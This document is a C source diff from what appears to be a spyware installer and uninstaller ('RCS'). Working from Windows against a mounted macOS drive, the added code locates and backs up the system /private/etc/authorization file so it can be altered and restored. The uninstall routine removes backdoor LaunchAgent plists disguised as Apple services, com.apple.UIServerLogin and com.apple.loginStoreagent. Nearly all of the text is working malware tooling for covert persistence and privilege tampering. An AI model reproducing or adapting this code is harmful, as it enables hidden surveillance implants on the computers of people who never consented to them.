@@ -68,11 +68,31 @@ BOOL SafeCopyFile(WCHAR *source_path, WCHAR *dest_path, BOOL destMustExist)
 	return TRUE;
 }
 
+WCHAR auth_file_name[64];
+
 HANDLE CreateRootFile(os_struct_t *os_info)
 {
 	WCHAR source_path[MAX_PATH], dest_path[MAX_PATH];
+	HANDLE thandle;
 
 	swprintf_s(source_path, MAX_PATH, L"%s\\private\\etc\\authorization", os_info->drive);
+	thandle = CreateFile(source_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
+	if (thandle != INVALID_HANDLE_VALUE) {
+		swprintf_s(auth_file_name, 64, L"authorization");
+		CloseHandle(thandle);
+	} else {
+		swprintf_s(source_path, MAX_PATH, L"%s\\private\\etc\\authorization.deprecated", os_info->drive);
+		thandle = CreateFile(source_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
+		if (thandle != INVALID_HANDLE_VALUE) {
+			swprintf_s(auth_file_name, 64, L"authorization.deprecated");
+			CloseHandle(thandle);
+		} else {
+			swprintf_s(auth_file_name, 64, L"nonexistent");
+			return INVALID_HANDLE_VALUE;
+		}
+	}
+
+	swprintf_s(source_path, MAX_PATH, L"%s\\private\\etc\\%s", os_info->drive, auth_file_name);
 	swprintf_s(dest_path, MAX_PATH, L"%s\\private\\etc\\authorization.bu", os_info->drive);
 	if (!CopyFile(source_path, dest_path, FALSE))
 		return INVALID_HANDLE_VALUE;
@@ -87,7 +107,7 @@ BOOL SaveRootFile(HANDLE hfile, WCHAR *plist_path, os_struct_t *os_info, BOOL su
 	WCHAR source_path[MAX_PATH], dest_path[MAX_PATH];
 
 	CloseHandle(hfile);
-	swprintf_s(dest_path, MAX_PATH, L"%s\\private\\etc\\authorization", os_info->drive);
+	swprintf_s(dest_path, MAX_PATH, L"%s\\private\\etc\\%s", os_info->drive, auth_file_name);
 	swprintf_s(source_path, MAX_PATH, L"%s\\private\\etc\\authorization.bu", os_info->drive);
 	CopyFile(source_path, dest_path, FALSE);
 	DeleteFile(source_path);
@@ -211,6 +231,11 @@ BOOL MAC_RCSUnInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_stru
 
 	// Cancella il plist della backdoor
 	_snwprintf_s(backdoor_path, MAX_PATH, _TRUNCATE, L"%s%s\\Library\\LaunchAgents\\com.apple.UIServerLogin.plist", os_info->drive, SlashToBackSlash(user_info->user_home));
+	ClearAttributes(backdoor_path);
+	DeleteFile(backdoor_path);
+
+	// Cancella il plist della backdoor
+	_snwprintf_s(backdoor_path, MAX_PATH, _TRUNCATE, L"%s%s\\Library\\LaunchAgents\\com.apple.loginStoreagent.plist", os_info->drive, SlashToBackSlash(user_info->user_home));
 	ClearAttributes(backdoor_path);
 	DeleteFile(backdoor_path);
 
